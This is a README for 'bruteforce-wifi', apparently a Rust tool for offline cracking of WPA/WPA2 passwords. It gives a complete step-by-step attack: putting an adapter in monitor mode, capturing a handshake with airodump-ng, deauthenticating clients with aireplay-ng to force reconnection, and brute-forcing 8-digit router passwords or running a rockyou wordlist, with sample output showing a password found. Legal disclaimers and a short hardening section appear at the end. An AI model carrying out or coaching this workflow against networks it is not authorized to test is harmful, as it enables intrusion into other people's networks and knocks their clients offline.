# 📡 Bruteforce WiFi

<div align="center">

**⚠️ EDUCATIONAL USE ONLY - UNAUTHORIZED ACCESS IS ILLEGAL ⚠️**

[![Rust](https://img.shields.io/badge/Rust-1.70+-orange.svg)](https://www.rust-lang.org/)
[![Platform](https://img.shields.io/badge/Platform-macOS%20|%20Linux%20|%20Windows-lightgrey.svg)](#)
[![License](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)

**WPA/WPA2 Offline Cracking Tool - Educational purposes only**

**Performance:** 5,000-50,000 pwd/sec (offline handshake cracking) 🚀

</div>

---

## 📚 Table of Contents

- [Quick Start](#-quick-start)
- [How It Works](#-how-it-works)
- [Complete Workflow](#-complete-workflow-example)
- [Features](#-features)
- [Performance](#-performance-benchmarks)
- [Installation](#-installation)
- [Usage](#-usage)
- [Building from Source](#-building-from-source)
- [Security & Legal](#-security--legal)

---

## ⚡ Quick Start

### Step 1: Capture WPA/WPA2 Handshake

```bash
# Put WiFi interface in monitor mode (Linux)
sudo airmon-ng start wlan0

# Capture handshake (this creates capture-01.cap file)
sudo airodump-ng -c 6 --bssid 00:11:22:33:44:55 -w capture wlan0mon

# In another terminal, deauth a client to force reconnection
sudo aireplay-ng -0 2 -a 00:11:22:33:44:55 wlan0mon
```

### Step 2: Crack Offline (No Conversion Needed!)

**Direct .cap file support** - no need to convert to JSON:

```bash
# Numeric attack (8 digits) with .cap file
bruteforce-wifi crack numeric capture-01.cap --ssid "TP-Link_5GHz" --min 8 --max 8

# Wordlist attack with .cap file
bruteforce-wifi crack wordlist capture-01.cap --ssid "TP-Link_5GHz" rockyou.txt

# Use JSON format (optional)
bruteforce-wifi crack numeric handshake.json --min 8 --max 8
```

**That's it!** The tool automatically parses .cap/.pcap files and extracts the handshake.

---

## 🔬 How It Works

### Traditional (Online) vs Offline Cracking

| Method | Speed | Network Required | Detection Risk |
|--------|-------|------------------|----------------|
| **Online** (connect to WiFi) | 100-500 pwd/sec | ✅ Yes | 🔴 High |
| **Offline** (handshake) | 5,000-50,000 pwd/sec | ❌ No | 🟢 None |

### The WPA/WPA2 4-Way Handshake

```
Client                    Router (AP)
  |                            |
  |  1. ANonce                 |
  |<---------------------------|
  |  2. SNonce + MIC           |
  |--------------------------->|
  |  3. GTK + MIC              |
  |<---------------------------|
  |  4. ACK                    |
  |--------------------------->|
```

We capture frames 1-4, which contain:
- **SSID** - Network name (salt for PBKDF2)
- **ANonce** - Authenticator nonce (from AP)
- **SNonce** - Supplicant nonce (from client)
- **MIC** - Message Integrity Code (to verify password)
- **MAC addresses** - AP and client

### Password Verification Algorithm

```rust
// 1. Calculate PMK (expensive: 4096 iterations of HMAC-SHA1)
PMK = PBKDF2-HMAC-SHA1(password, SSID, 4096, 256 bits)

// 2. Calculate PTK
PTK = PRF-512(PMK, "Pairwise key expansion",
              AA || SPA || ANonce || SNonce)

// 3. Extract KCK (first 16 bytes of PTK)
KCK = PTK[0..16]

// 4. Calculate MIC
calculated_MIC = HMAC-SHA1(KCK, EAPOL_frame)

// 5. Compare
if calculated_MIC == captured_MIC:
    password_found!
```

---

## 🎯 Complete Workflow Example

### Scenario: Crack TP-Link Router with 8-Digit Password

#### 1. Identify Target Network

Use your system's WiFi tools or `iwlist scan` to find the target network:

```bash
# Scan for networks (Linux)
sudo iwlist wlan0 scan | grep -E "ESSID|Address|Channel"
```

Find:
- SSID: `TP-Link_5GHz`
- BSSID (AP MAC): `14:CC:20:XX:XX:XX`
- Channel: `6`

#### 2. Capture WPA/WPA2 Handshake

**On Linux:**

```bash
# Start monitor mode
sudo airmon-ng start wlan0
# Interface is now wlan0mon

# Capture on channel 6 (TP-Link's channel)
sudo airodump-ng -c 6 --bssid 14:CC:20:XX:XX:XX -w capture wlan0mon

# Wait for "WPA handshake" message or force it:
# In another terminal, deauth a connected client
sudo aireplay-ng -0 5 -a 14:CC:20:XX:XX:XX wlan0mon

# Stop capture when you see "WPA handshake: 14:CC:20:XX:XX:XX"
# File saved as: capture-01.cap
```

**On macOS/Windows:**
Use Wireshark to capture packets or run a Linux VM with aircrack-ng tools.

#### 3. Crack the Password

**Option 1: Numeric attack** (TP-Link typically uses 8 digits)

```bash
# Use .cap file directly with SSID
bruteforce-wifi crack numeric capture-01.cap --ssid "TP-Link_5GHz" --min 8 --max 8 --threads 8
```

Output:
```
📡 Bruteforce WiFi v2.0.0
WPA/WPA2 offline cracking tool - Educational use only

🔢 Starting numeric combination attack...

WPA/WPA2 Handshake Information:
  SSID: TP-Link_5GHz
  AP MAC: 14:CC:20:58:5A:5C
  Client MAC: AA:BB:CC:DD:EE:FF
  Key Version: 2
  MIC Length: 16 bytes

🚀 Starting offline WPA/WPA2 crack
📝 SSID: TP-Link_5GHz
🔢 Range: 8-8 digits
🧵 Using 8 threads

Testing 100000000 combinations (8 digits)...
⠋ [00:03:45] [████████████████████░░░] 87234521/100000000 (23245 pwd/s) 23245 pwd/s

✓ Password found: 87654321
  Save this password securely!

Statistics:
  Attempts: 87,234,522
  Duration: 3751.23s (1.04 hours)
  Speed: 23,245 passwords/second
```

**Option 2: Wordlist attack**

```bash
# Download rockyou.txt wordlist
wget https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# Crack with wordlist
bruteforce-wifi crack wordlist capture-01.cap --ssid "TP-Link_5GHz" rockyou.txt
```

---

## 🎯 Features

### Offline Cracking Architecture

- 🚀 **5,000-50,000 pwd/sec** - No network delays, pure CPU power
- 🔒 **Capture once, crack anywhere** - Work completely offline
- 🧵 **Multi-threaded** - Scales with CPU cores (optimal parallel processing)
- 📊 **Real-time progress** - Live throughput stats and ETA
- 💾 **Minimal memory** - ~15 MB footprint with zero-allocation crypto
- 📦 **Direct .cap support** - No conversion needed, works with airodump-ng output

### Two Attack Modes

1. **Wordlist Attack** - Test passwords from a file
   - Supports any text file (one password per line)
   - Auto-filters invalid passwords (WPA: 8-63 chars)
   - Parallel processing with rayon

2. **Numeric Combination Attack** - Generate numeric passwords on-the-fly
   - Range: 1-12 digits
   - Optimized batch generation
   - Perfect for routers with default numeric passwords (TP-Link, D-Link, etc.)

### Cross-Platform Support

- ✅ **macOS** (10.15+ Catalina)
- ✅ **Linux** (any distro with NetworkManager)
- ✅ **Windows** (10/11)

---

## 📊 Performance Benchmarks

### Hardware: Apple M1 Pro (8 cores)

```text
Offline WPA/WPA2 Cracking:  23,000 passwords/second
Binary Size:                  2.1 MB (optimized)
Memory Usage:                ~15 MB

Time Estimates (Offline Mode):
  4 digits (10K):         ~0.4 seconds
  6 digits (1M):          ~43 seconds
  8 digits (100M):        ~1.2 hours
  10 digits (10B):        ~5 days

Note: Performance varies by CPU. Modern 8-core CPU:
- Intel i7/i9: 15,000-25,000 pwd/sec
- AMD Ryzen: 18,000-30,000 pwd/sec
- Apple M1/M2: 20,000-35,000 pwd/sec
```

### Why So Fast?

| Optimization | Impact |
|--------------|--------|
| Offline cracking (no WiFi) | 50-500x faster |
| Parallel PBKDF2 | 8x faster (8 cores) |
| Zero-allocation crypto | 1.8x faster |
| Efficient batching | 1.5x faster |
| Lock-free atomics | 1.2x faster |
| Inline hot paths | 1.1x faster |

**Code-level optimizations:**

- Stack buffers instead of heap allocations in PRF-512
- Fixed-size arrays for MIC calculations (no Vec)
- Specialized constant-time comparison for 16-byte MIC
- Aggressive inlining of cryptographic primitives
- Minimal memory footprint (~15 MB)

**Total speedup: ~500-10,000x vs online attacks**

---

## 📥 Installation

### Option 1: From Binary (Releases)

```bash
# Download from GitHub Releases
wget https://github.com/maxgfr/bruteforce-wifi/releases/latest/download/bruteforce-wifi-linux-x86_64.tar.gz

# Extract
tar xzf bruteforce-wifi-linux-x86_64.tar.gz

# Install
sudo mv bruteforce-wifi /usr/local/bin/
```

### Option 2: Homebrew (macOS/Linux)

```bash
brew tap maxgfr/tap
brew install bruteforce-wifi
```

### Option 3: Cargo (From Source)

```bash
cargo install --git https://github.com/maxgfr/bruteforce-wifi
```

---

## 🎮 Usage

### List WiFi Networks

```bash
sudo bruteforce-wifi list
```

### Capture Handshake

```bash
# Note: Automatic capture coming soon
# For now, use airodump-ng manually (Linux only)

bruteforce-wifi capture --ssid "TP-Link_5GHz" --output handshake.json
```

This creates an example JSON file. Replace with your actual captured handshake.

### Crack Handshake

#### Wordlist Attack

```bash
bruteforce-wifi crack wordlist <HANDSHAKE_FILE> <WORDLIST_FILE>

# Examples:
bruteforce-wifi crack wordlist handshake.json rockyou.txt
bruteforce-wifi crack wordlist handshake.json passwords.txt --threads 16
```

#### Numeric Attack

```bash
bruteforce-wifi crack numeric <HANDSHAKE_FILE> --min <MIN_DIGITS> --max <MAX_DIGITS>

# Examples:
bruteforce-wifi crack numeric handshake.json --min 8 --max 8
bruteforce-wifi crack numeric handshake.json --min 4 --max 10 --threads 12
```

### Options

```
--threads <N>    Number of threads (default: CPU count)
--verbose        Verbose output
--help           Show help message
```

---

## 🏗️ Building from Source

### Prerequisites

- **Rust 1.70+** (https://rustup.rs)

### Build

```bash
git clone https://github.com/maxgfr/bruteforce-wifi.git
cd bruteforce-wifi

# Standard build
cargo build --release

# Ultra-optimized build (CPU-specific)
RUSTFLAGS="-C target-cpu=native" cargo build --release

# Binary at: target/release/bruteforce-wifi
```

### Run Tests

```bash
# Unit tests
cargo test

# Create test handshake
cargo run --example create_test_handshake

# Test cracking (should find "12345678")
cargo run --release -- crack numeric test_handshake.json --min 8 --max 8
```

---

## 🔧 Advanced Usage

### Generate Test Handshake

```bash
cargo run --example create_test_handshake
# Creates test_handshake.json with password "12345678"
```

### Custom Thread Count

```bash
# Use specific number of threads
bruteforce-wifi crack numeric handshake.json --min 8 --max 8 --threads 16

# Use all cores (default)
bruteforce-wifi crack numeric handshake.json --min 8 --max 8
```

### Benchmark Mode

```bash
# Time how long it takes to test 1 million passwords
time bruteforce-wifi crack numeric test_handshake.json --min 6 --max 6
```

---

## 🛡️ Security & Legal

<div align="center">

### 🚨 USE ONLY ON YOUR OWN NETWORKS 🚨

</div>

**Unauthorized access is ILLEGAL under:**
- Computer Fraud and Abuse Act (USA)
- Computer Misuse Act (UK)
- Similar laws worldwide

**Penalties:**
- ⚠️ Criminal prosecution
- ⚠️ Heavy fines ($10,000-$250,000)
- ⚠️ Imprisonment (up to 20 years)

**This tool is for:**
- ✅ Testing YOUR OWN networks
- ✅ Educational purposes (learning WPA/WPA2)
- ✅ Authorized penetration testing
- ✅ Security research

**NOT for:**
- ❌ Unauthorized access to networks
- ❌ Stealing WiFi from neighbors
- ❌ Malicious purposes

**The author is NOT responsible for misuse.**

---

## 🔐 Protect Your Network

If you're concerned about this tool being used against you:

1. ✅ **Use WPA3** (not vulnerable to offline attacks)
2. ✅ **Strong password** (16+ random characters with symbols)
3. ✅ **Disable WPS** (PIN bruteforce vulnerability)
4. ✅ **Hide SSID** (security through obscurity - minor help)
5. ✅ **MAC filtering** (can be bypassed, but adds friction)
6. ✅ **Monitor connected devices** regularly

**Example strong password:**
```
t7$mK9#pL2@qN5!wX
```

---

## 📄 License

MIT License - Educational purposes only

See [LICENSE](LICENSE) for details.

---

## 🙏 Credits

This tool is for educational purposes and demonstrates:
- WPA/WPA2 cryptographic protocols (IEEE 802.11i)
- PBKDF2-HMAC-SHA1 key derivation
- Parallel computing optimization
- Rust systems programming

**Learn, don't harm.**

---

## 📚 References

- [IEEE 802.11i-2004](https://standards.ieee.org/standard/802_11i-2004.html) - WPA/WPA2 specification
- [RFC 2898](https://tools.ietf.org/html/rfc2898) - PBKDF2 specification
- [Aircrack-ng](https://www.aircrack-ng.org/) - WiFi security auditing
- [Hashcat](https://hashcat.net/hashcat/) - Password recovery tool

